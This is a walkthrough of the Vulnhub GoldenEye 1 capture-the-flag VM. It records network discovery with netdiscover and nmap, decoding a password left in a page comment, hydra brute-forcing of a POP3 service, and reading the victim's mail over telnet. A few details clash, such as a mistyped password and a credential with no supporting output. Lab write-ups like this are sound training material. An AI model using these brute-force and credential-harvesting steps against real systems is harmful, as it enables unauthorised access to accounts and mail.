---
title: GoldenEye 1 machine walkthrough
author: amandaguglieri
draft: false
TableOfContents: true
tag: walkthroughs
---

## About the machine


| data |  |
|--------| ------- |
| Machine | GoldenEye 1 |
| Platform | Vulnhub |
| url | [link](https://www.vulnhub.com/entry/goldeneye-1,240/) | 
| Download | [https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq](https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq) |
| Download Mirror | [https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova](https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova) |
| Size | 805 MB |
| Author | [creosote](https://www.vulnhub.com/author/creosote,584/) |
| Release date | 4 May 2018 |
| Description | OSCP type vulnerable machine that's themed after the great James Bond film (and even better n64 game) GoldenEye. The goal is to get root and capture the secret GoldenEye codes - flag.txt. |
| Dificulty | Easy |
| Points | 20 |


## Walkthrough

### Setting up the machines

I'll be using Virtual Box.

Kali machine (from now on: attacker machine) will have two network interfaces: 

- eth0 interface: NAT mode (for internet connection).
- eth1 interface: Host-only mode (for attacking the victim machine).

GoldenEye 1 machine (from now on: victim machine) will have only one network interface:

- eth0 interface.


### Reconnaissance

**First**, we need to identify our IP, and afterwards our IP's victim address. For that we'll be using [netdiscover](netdiscover.md).

```bash
ip a
```

eth1 interface of the attacker machine will be: 192.168.56.105.

```bash
sudo netdiscover -i eth1 -r 192.168.56.105/24
```

Results:

```
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                  
 192.168.56.100  08:00:27:66:9a:ab      1      60  PCS Systemtechnik GmbH                                          
 192.168.56.101  08:00:27:dd:34:ac      1      60  PCS Systemtechnik GmbH
 ```

 So, the victim's IP address is: 192.168.56.101.

 
**Secondly**, let's run a port scan to see services:

```bash
nmap -p- -A 192.168.56.101
```

And results:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 13:31 EST
Nmap scan report for 192.168.56.101
Host is up (0.00013s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES TOP USER UIDL PIPELINING AUTH-RESP-CODE CAPA
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE STLS SASL(PLAIN) USER CAPA PIPELINING TOP UIDL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.89 seconds
```

As there is an Apache server, let's see what is in there. We'll be opening http://192.168.56.101 in our browser. 

In the front page they will give you an url to login: /serv-home/, and looking at the source code, in the terminal.js file you can read a section commented out:

```
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

Now, we have two usernames: boris and natalya, and we also have an aparently URL-encoded password. By using Burp Decode, we can extract the password: InvincibleHack3r

Third, now we can browse to http://192.168.56.101/sev-home and a [Basic-Authentification](http-authentication-schemes.md) pop-up will be displayed. To login into the system, enter:

+ user: boris
+ password: InvincibleHack3r

**Fourth**, in the landing page we can read this valuable information: "Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port". 

Also by looking at the source code we can read this commented line:

```
<!-- Qualified GoldenEye Network Operator Supervisors: Natalya Boris -->
```

mmmm

As we know there are some high ports (such as 55007 and 55008) open and running dovecot pop3 service, maybe we can try to access it with the telnet protocol in port 55007. 


```
# First, port 55007

└─$ telnet 192.168.56.101 55007
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASSWORD InvincibleHack3r
-ERR Unknown command.
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER natalya
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.

# Second, port 55008

└─$ telnet 192.168.56.101 55008
Trying 192.168.56.101...
telnet: Unable to connect to remote host: Connection refused
```


**Fifth**, let's try to brute-force the service by using [hydra](hydra.md).

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3
```

And the results:

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-17 13:57:42
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://192.168.56.101:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-17 14:00:19
```

We do the same for the user natalya.

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s55007 pop3
```

And the results:

```

```

So now, we have these credentials for the dovecot pop3 service:

+ user: boris
+ password: secre1!

* user: natalya
+ password: bird


**Sixth**, let's access dovecot pop3 service with telnet as we tried before, and if succeeded, let's read all messages from inbox:

```bash
telnet 192.168.56.101 55007
```

Results:

```
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
```

Now let's RETRIEVE all messages from inbox:

```
# For retrieving first message:
RETR 1

# For retrieving second message:
RETR 2

# For retrieving third message:
RETR 3

# For retrieving fourth message:
RETR 4

# There was no fifth message
```

And messages are:

```
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
RETR 5
-ERR There's no message 5.
```


